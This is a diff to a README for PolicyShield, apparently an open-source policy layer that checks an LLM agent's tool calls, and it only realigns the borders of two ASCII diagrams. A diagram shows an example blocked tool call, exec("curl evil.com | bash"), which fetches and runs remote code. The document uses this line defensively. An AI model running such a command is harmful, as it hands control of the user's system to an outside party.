@@ -31,13 +31,13 @@ PolicyShield is a runtime policy layer that sits between the LLM and the tools i
        │  tool call: exec("curl evil.com | bash")
        ▼
    ┌─────────────────────────────────────────────┐
-   │  PolicyShield                                │
-   │                                              │
-   │  1. Match rules (shell injection? → BLOCK)   │
-   │  2. Detect PII  (email, SSN, credit card)    │
-   │  3. Check budget ($5/session limit)           │
-   │  4. Rate limit  (10 calls/min)               │
-   │  5. Log decision (JSONL audit trail)          │
+   │  PolicyShield                               │
+   │                                             │
+   │  1. Match rules (shell injection? → BLOCK)  │
+   │  2. Detect PII  (email, SSN, credit card)   │
+   │  3. Check budget ($5/session limit)         │
+   │  4. Rate limit  (10 calls/min)              │
+   │  5. Log decision (JSONL audit trail)        │
    └─────────────────────────────────────────────┘
        │
        ▼
@@ -144,11 +144,11 @@ PolicyShield works as a sidecar to [OpenClaw](https://github.com/AgenturAI/OpenC
   ┌──────────────┐              ┌──────────────────┐
   │  LLM calls   │  HTTP check  │  11 YAML rules   │
   │  exec("rm…") │────────────→ │  ↓               │
-  │              │   BLOCK ←────│  match → verdict  │
-  │  Tool NOT    │              │                   │
-  │  executed    │              │  PII detection    │
-  └──────────────┘              │  Rate limiting    │
-                                │  Audit trail      │
+  │              │   BLOCK ←────│  match → verdict │
+  │  Tool NOT    │              │                  │
+  │  executed    │              │  PII detection   │
+  └──────────────┘              │  Rate limiting   │
+                                │  Audit trail     │
                                 └──────────────────┘
 ```
 
